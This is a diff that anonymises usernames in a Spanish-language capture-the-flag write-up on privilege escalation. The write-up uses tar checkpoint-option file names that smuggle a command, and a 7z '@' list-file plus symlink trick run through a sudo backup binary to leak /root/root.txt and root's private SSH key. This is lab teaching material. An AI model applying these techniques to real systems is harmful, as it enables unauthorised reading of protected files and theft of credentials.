@@ -627,11 +627,11 @@ total 56
 drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
 drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
 -rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
--rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
--rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
+-rw-rw-r--  1 user        user    1 Aug 31 23:11 --checkpoint=1
+-rw-rw-r--  1 user        user    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
 drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
 drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
--rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
+-rw-rw-r--  1 user        user   60 Aug 31 23:11 root.sh
 
 ┌─[user@user]─[/]
 └──╼ sudo -l
@@ -652,14 +652,14 @@ Dado que el backup incluye todos los archivos del directorio, el siguiente paso 
 Primero, se crea un archivo cuyo nombre comienza con `@`, ya que `7z` interpreta este tipo de archivo como una lista de entradas a procesar:
 
 ```
-xander@usage:/var/www/html$ touch @root.txt
-xander@usage:/var/www/html$ ls -al
+user@user:/var/www/html$ touch @root.txt
+user@user:/var/www/html$ ls -al
 total 16
-drwxrwxrwx  4 root   xander 4096 Aug 15 07:24 .
+drwxrwxrwx  4 root   user 4096 Aug 15 07:24 .
 drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
-drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
--rw-rw-r--  1 xander xander    0 Aug 15 07:24 @root.txt
-drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
+drwxrwxr-x 13 test   test   4096 Apr  2  2024 project_admin
+-rw-rw-r--  1 user   user    0 Aug 15 07:24 @root.txt
+drwxrwxr-x 12 test   test   4096 Apr  2  2024 blog
 ```
 
 Al listar el contenido del directorio, se confirma que el archivo fue creado correctamente y que el usuario tiene permisos de escritura.
@@ -667,15 +667,15 @@ Al listar el contenido del directorio, se confirma que el archivo fue creado cor
 Luego, se crea un enlace simbólico llamado `root.txt` que apunta a un archivo sensible ubicado en un directorio no accesible directamente por el usuario:
 
 ```
-xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
-xander@usage:/var/www/html$ ls -al
+user@user:/var/www/html$ ln -s /root/root.txt root.txt
+user@user:/var/www/html$ ls -al
 total 16
-drwxrwxrwx  4 root   xander 4096 Aug 15 07:25 .
+drwxrwxrwx  4 root   user 4096 Aug 15 07:25 .
 drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
-drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
--rw-rw-r--  1 xander xander    0 Aug 15 07:24 @root.txt
-lrwxrwxrwx  1 xander xander   14 Aug 15 07:25 root.txt -> /root/root.txt
-drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
+drwxrwxr-x 13 test   test   4096 Apr  2  2024 project_admin
+-rw-rw-r--  1 user   user    0 Aug 15 07:24 @root.txt
+lrwxrwxrwx  1 user   user   14 Aug 15 07:25 root.txt -> /root/root.txt
+drwxrwxr-x 12 test   test   4096 Apr  2  2024 blog
 ```
 
 Cuando el proceso de backup es ejecutado con privilegios elevados mediante el binario vulnerable `/usr/bin/usage_management`, el comando `7z` procesa el wildcard e interpreta `@root.txt` como un archivo que contiene la lista de ficheros a comprimir.
@@ -687,7 +687,7 @@ Debido a que `root.txt` es un symlink hacia `/root/root.txt`, `7z` intenta leer 
 Este comportamiento permite la **lectura arbitraria de archivos protegidos**, siempre que el atacante pueda crear archivos y enlaces simbólicos en el directorio respaldado.
 
 ```
-xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+user@user:/var/www/html$ sudo /usr/bin/usage_management
 Choose an option:
 1. Project Backup
 2. Backup MySQL data
@@ -732,29 +732,29 @@ El mismo comportamiento puede explotarse para acceder a claves privadas del usua
 Se crea nuevamente un archivo con prefijo `@`:
 
 ```
-xander@usage:/var/www/html$ touch @id_rsa
-xander@usage:/var/www/html$ ls -al
+user@user:/var/www/html$ touch @id_rsa
+user@user:/var/www/html$ ls -al
 total 16
-drwxrwxrwx  4 root   xander 4096 Aug 15 07:47 .
+drwxrwxrwx  4 root   user 4096 Aug 15 07:47 .
 drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
--rw-rw-r--  1 xander xander    0 Aug 15 07:47 @id_rsa
-drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
-lrwxrwxrwx  1 xander xander   14 Aug 15 07:25 root.txt -> /root/root.txt
-drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
+-rw-rw-r--  1 user user    0 Aug 15 07:47 @id_rsa
+drwxrwxr-x 13 test   test   4096 Apr  2  2024 project_admin
+lrwxrwxrwx  1 user user   14 Aug 15 07:25 root.txt -> /root/root.txt
+drwxrwxr-x 12 test   test   4096 Apr  2  2024 usage_blog
 ```
 
 Posteriormente, se crea un enlace simbólico que apunta a la clave privada SSH del usuario root:
 
 ```
-xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
-xander@usage:/var/www/html$ ls -al
+user@user:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
+user@user:/var/www/html$ ls -al
 total 16
-drwxrwxrwx  4 root   xander 4096 Aug 15 07:48 .
+drwxrwxrwx  4 root   user 4096 Aug 15 07:48 .
 drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
-lrwxrwxrwx  1 xander xander   17 Aug 15 07:48 id_rsa -> /root/.ssh/id_rsa
-drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
-lrwxrwxrwx  1 xander xander   14 Aug 15 07:25 root.txt -> /root/root.txt
-drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
+lrwxrwxrwx  1 user user   17 Aug 15 07:48 id_rsa -> /root/.ssh/id_rsa
+drwxrwxr-x 13 test   test   4096 Apr  2  2024 project_admin
+lrwxrwxrwx  1 user user   14 Aug 15 07:25 root.txt -> /root/root.txt
+drwxrwxr-x 12 test   test   4096 Apr  2  2024 usage_blog
 ```
 
 Al ejecutarse el backup, `7z` interpreta `@id_rsa` como un archivo de lista y termina leyendo el contenido del symlink `id_rsa`. Como el contenido no es válido para el proceso de compresión, se produce un error que expone la **clave privada SSH de root**.
